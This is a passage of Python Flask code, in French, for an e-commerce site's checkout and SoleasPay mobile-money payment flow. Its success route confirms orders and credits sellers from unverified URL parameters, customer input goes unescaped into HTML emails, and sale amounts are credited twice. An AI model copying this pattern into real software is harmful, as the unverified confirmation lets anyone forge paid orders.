@app.route("/api/panier/clear", methods=["POST"])
def api_vider_panier():
    """API: Vider le panier"""
    panier, user = get_or_create_panier()
    ArticlePanier.query.filter_by(panier_id=panier.id).delete()
    db.session.commit()
    
    return jsonify({"success": True, "message": "Panier vidé"})


# ==============================
# 💳 SYSTEME DE PAIEMENT - ROUTES
# ==============================

@app.route("/checkout", methods=["GET", "POST"])
def checkout_page():
    """Page de paiement avec formulaire"""
    user = get_logged_in_user()
    panier, _ = get_or_create_panier()
    
    if panier.articles.count() == 0:
        flash("Votre panier est vide.", "warning")
        return redirect(url_for("cart_page"))
    
    total = panier.get_total()
    frais_livraison = 0 if total > 50000 else 2000
    grand_total = total + frais_livraison
    
    if request.method == "POST":
        nom_complet = request.form.get("nom_complet", "").strip()
        email = request.form.get("email", "").strip()
        telephone = request.form.get("telephone", "").strip()
        indicatif = request.form.get("indicatif", "+225").strip()
        adresse = request.form.get("adresse", "").strip()
        ville = request.form.get("ville", "").strip()
        payment_method = request.form.get("payment_method", "").strip()
        
        if not all([nom_complet, email, telephone, adresse, ville, payment_method]):
            flash("Tous les champs sont obligatoires.", "danger")
            return render_template("checkout.html", 
                user=user, panier=panier, total=total, 
                frais_livraison=frais_livraison, grand_total=grand_total)
        
        telephone = telephone.replace(" ", "").replace("-", "").replace(".", "")
        numero_complet = indicatif + telephone
        
        reference = f"CMD-{uuid.uuid4().hex[:8].upper()}"
        
        premier_article = panier.articles.first()
        if not premier_article:
            flash("Panier vide.", "danger")
            return redirect(url_for("cart_page"))
        
        boutique = premier_article.produit.boutique
        
        nouvelle_commande = Commande(
            user_id=user.id if user else None,
            boutique_id=boutique.id,
            reference=reference,
            statut="en_attente_paiement",
            total=grand_total,
            frais_livraison=frais_livraison,
            adresse_livraison=f"{adresse}, {ville}",
            telephone_livraison=numero_complet,
            notes=f"Email: {email}, Nom: {nom_complet}"
        )
        
        db.session.add(nouvelle_commande)
        db.session.flush()
        
        for article in panier.articles:
            produit = article.produit
            prix_actuel = produit.prix_promo if (produit.prix_promo and produit.prix_promo < produit.prix) else produit.prix
            article_commande = ArticleCommande(
                commande_id=nouvelle_commande.id,
                produit_id=produit.id,
                quantite=article.quantite,
                prix_unitaire=prix_actuel
            )
            db.session.add(article_commande)
        
        db.session.commit()
        
        return initier_paiement_soleaspay(nouvelle_commande, numero_complet, grand_total, email, nom_complet, payment_method)
    
    return render_template("checkout.html", 
        user=user, panier=panier, total=total, 
        frais_livraison=frais_livraison, grand_total=grand_total)


def initier_paiement_soleaspay(commande, telephone, montant, email, nom, payment_method_str):
    """Initie le paiement via SoleasPay"""
    service_map = {
        "momo": 1, "om": 2, "wave": 32,
        "momo_ci": 30, "om_ci": 29,
    }
    
    service_id = service_map.get(payment_method_str, 1)
    
    payload = {
        "wallet": telephone,
        "amount": montant,
        "currency": "XOF",
        "order_id": f"NOVA-{commande.id}",
        "description": f"Paiement commande {commande.reference}",
        "payer": nom,
        "payerEmail": email,
        "successUrl": url_for("paiement_succes", _external=True),
        "failureUrl": url_for("paiement_echec", _external=True),
    }
    
    headers = {
        "x-api-key": SOLEAS_API_KEY,
        "operation": "2",
        "service": str(service_id),
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(
            "https://soleaspay.com/api/agent/bills/v3",
            headers=headers,
            json=payload,
            timeout=30
        )
        result = response.json()
        
        if result.get("succès") or result.get("success"):
            payment_url = result.get("payment_url") or result.get("redirect_url")
            if payment_url:
                return redirect(payment_url)
            else:
                flash("Veuillez confirmer le paiement sur votre téléphone.", "info")
                return redirect(url_for("paiement_en_attente", commande_id=commande.id))
        else:
            flash(f"Erreur de paiement : {result.get('message', 'Erreur inconnue')}", "danger")
            return redirect(url_for("checkout_page"))
    except Exception as e:
        flash(f"Erreur de connexion au serveur de paiement : {e}", "danger")
        return redirect(url_for("checkout_page"))


@app.route("/paiement/succes")
def paiement_succes():
    """Page de succès après paiement"""
    order_id = request.args.get("orderId")
    pay_id = request.args.get("payId")
    
    if not order_id or not pay_id:
        flash("Paramètres de paiement invalides.", "danger")
        return redirect(url_for("index_page"))
    
    try:
        commande_id = int(order_id.replace("NOVA-", ""))
    except:
        flash("Commande introuvable.", "danger")
        return redirect(url_for("index_page"))
    
    commande = Commande.query.get(commande_id)
    if not commande:
        flash("Commande introuvable.", "danger")
        return redirect(url_for("index_page"))
    
    commande.statut = "confirmee"
    db.session.commit()
    
    traiter_commande_apres_paiement(commande)
    
    ArticlePanier.query.filter_by(panier_id=commande.user.paniers.first().id if commande.user else None).delete()
    db.session.commit()
    
    flash(f"Paiement réussi ! Référence : {commande.reference}", "success")
    return render_template("paiement_succes.html", commande=commande)


@app.route("/paiement/echec")
def paiement_echec():
    """Page d'échec de paiement"""
    flash("Le paiement a échoué. Veuillez réessayer.", "danger")
    return redirect(url_for("checkout_page"))


@app.route("/paiement/attente/<int:commande_id>")
def paiement_en_attente(commande_id):
    """Page d'attente de confirmation"""
    commande = Commande.query.get_or_404(commande_id)
    return render_template("paiement_en_attente.html", commande=commande)


def traiter_commande_apres_paiement(commande):
    """Traite une commande après paiement confirmé"""
    boutique = commande.boutique
    vendeur = boutique.proprietaire
    
    montant_vente = commande.total - commande.frais_livraison
    
    vendeur.solde_revenu = (vendeur.solde_revenu or 0) + montant_vente
    vendeur.solde_parrainage = (vendeur.solde_parrainage or 0) + montant_vente
    
    for article in commande.articles:
        produit = article.produit
        produit.ventes = (produit.ventes or 0) + article.quantite
        produit.quantite = max(0, (produit.quantite or 1) - article.quantite)
    
    envoyer_email_notification_vente(vendeur, commande)
    
    if commande.user and commande.user.parrain:
        parrain = User.query.filter_by(username=commande.user.parrain).first()
        if parrain:
            commission = montant_vente * 0.05
            parrain.solde_revenu = (parrain.solde_revenu or 0) + commission
            parrain.solde_parrainage = (parrain.solde_parrainage or 0) + commission
    
    db.session.commit()


def envoyer_email_notification_vente(vendeur, commande):
    """Envoie un email au vendeur pour une nouvelle vente"""
    if not vendeur.email:
        return
    
    try:
        articles_details = []
        for article in commande.articles:
            articles_details.append(f"{article.produit.nom} x{article.quantite} - {article.prix_unitaire * article.quantite} XOF")
        
        nom_client = "N/A"
        email_client = "N/A"
        if commande.notes:
            if "Nom:" in commande.notes:
                nom_client = commande.notes.split("Nom:")[1].split(",")[0]
            if "Email:" in commande.notes:
                email_client = commande.notes.split("Email:")[1].split(",")[0]
        
        html_content = f"""
        <h2>🎉 Nouvelle Vente !</h2>
        <p>Vous avez reçu une nouvelle commande sur votre boutique <strong>{commande.boutique.nom}</strong>.</p>
        
        <h3>Détails de la commande :</h3>
        <ul>
            <li><strong>Référence :</strong> {commande.reference}</li>
            <li><strong>Montant :</strong> {commande.total} XOF</li>
            <li><strong>Client :</strong> {nom_client}</li>
            <li><strong>Email :</strong> {email_client}</li>
            <li><strong>Téléphone :</strong> {commande.telephone_livraison}</li>
            <li><strong>Adresse :</strong> {commande.adresse_livraison}</li>
        </ul>
        
        <h3>Articles commandés :</h3>
        <ul>
            {''.join([f'<li>{detail}</li>' for detail in articles_details])}
        </ul>
        
        <p>Votre solde a été crédité de <strong>{commande.total - commande.frais_livraison} XOF</strong>.</p>
        """
        
        if API_KEY:
            requests.post(
                "https://api.resend.com/emails",
                headers={
                    "Authorization": f"Bearer {API_KEY}",
                    "Content-Type": "application/json"
                },
                json={
                    "from": "NovaTrade <no-reply@nova-trade.cc>",
                    "to": [vendeur.email],
                    "subject": f"🎉 Nouvelle vente - Commande {commande.reference}",
                    "html": html_content
                }
            )
    except Exception as e:
        print(f"Erreur envoi email notification: {e}")


@app.route("/cart")
def cart_page():
    """Page panier"""
    user = get_logged_in_user()
    return render_template("cart.html", user=user)

